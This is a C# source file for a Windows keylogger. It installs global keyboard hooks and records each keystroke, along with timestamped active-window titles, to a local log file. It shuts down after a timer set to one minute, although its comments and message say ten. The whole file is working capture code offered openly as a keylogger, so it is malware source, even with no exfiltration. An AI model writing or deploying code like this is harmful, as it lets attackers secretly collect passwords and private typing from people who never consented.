using Gma.System.MouseKeyHook;
using System;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Timer = System.Timers.Timer;

namespace Keylogger
{
    class Program
    {
        private static IKeyboardMouseEvents m_Events;
        private static Timer m_timer;
        private static StreamWriter m_writer;
        private static string m_lastWindowTitle = string.Empty;

        static void Main(string[] args)
        {
            // Create a new file and open a StreamWriter to write to it
            m_writer = new StreamWriter("logger.txt", true);
            m_writer.AutoFlush = true;

            // Set up the timer to flush the buffer every 10 minutes
            m_timer = new Timer(60000);
            m_timer.Elapsed += TimerElapsed;
            m_timer.Start();

            // Set up the global hook for keyboard and mouse events
            m_Events = Hook.GlobalEvents();
            m_Events.KeyDown += OnKeyDown;
            m_Events.KeyPress += OnKeyPress;

            // Keep the program running
            Application.Run();
        }

        private static void OnKeyDown(object sender, KeyEventArgs e)
        {
            var windowTitle = GetActiveWindowTitle();
            if (windowTitle != m_lastWindowTitle)
            {
                // Write the window title to the log file
                m_writer.WriteLine($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [{windowTitle}]");
                m_lastWindowTitle = windowTitle;
            }
            if (e.KeyCode == Keys.Tab)
                m_writer.Write("[TAB]");
            else if (e.KeyCode == Keys.Enter)
                m_writer.Write("[ENTER]");
            else if (e.KeyCode == Keys.Space)
                m_writer.Write(" ");
            else if (e.KeyCode == Keys.Back)
                m_writer.Write("[BackSpace]");
            else if (e.KeyCode == Keys.Return)
                m_writer.Write(@"[\n]");
            else if (e.KeyCode == Keys.Escape)
                m_writer.Write("[ESC]");
            else if (e.KeyCode == Keys.LControlKey || e.KeyCode == Keys.RControlKey)
                m_writer.Write("[CTRL]");
            else if (e.KeyCode == Keys.LWin || e.KeyCode == Keys.RWin)
                m_writer.Write("[WIN]");
            else if (e.KeyCode == Keys.RShiftKey || e.KeyCode == Keys.LShiftKey)
                m_writer.Write("[SHIFT]");
        }

        private static void OnKeyPress(object sender, KeyPressEventArgs e)
        {
            // Write the key press to the log file
            m_writer.Write(e.KeyChar);
        }

        private static void TimerElapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            // Flush the buffer to the log file
            m_writer.Flush();
            MessageBox.Show("keylogger has stopped runing after 10 min");
            Environment.Exit(0);
        }

        private static string GetActiveWindowTitle()
        {
            var handle = GetForegroundWindow();
            var length = GetWindowTextLength(handle) + 1;
            var builder = new StringBuilder(length);
            GetWindowText(handle, builder, length);
            return builder.ToString();
        }

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern int GetWindowTextLength(IntPtr hWnd);
    }
}